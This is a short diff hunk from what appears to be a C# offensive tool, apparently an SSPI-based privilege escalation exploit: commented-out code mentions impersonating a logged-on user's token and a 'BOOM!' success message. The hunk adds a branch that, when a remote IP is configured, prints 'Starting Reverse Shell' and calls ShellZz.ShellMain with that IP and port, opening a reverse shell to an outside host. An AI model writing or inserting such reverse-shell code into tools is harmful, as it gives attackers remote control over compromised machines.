@@ -646,7 +646,11 @@ namespace SSPITest
                         ImpersonateLoggedOnUser(hToken);
                     }
                     */
-
+                    if (V.rev_ip != "")
+                    {
+                        Console.WriteLine("Starting Reverse Shell");
+                        ShellZz.ShellMain(V.rev_ip, V.rev_port);
+                    }
                     Console.WriteLine("BOOM!... Sleep: {0}msec", V.sleep_time);
                     Thread.Sleep(V.sleep_time);
 
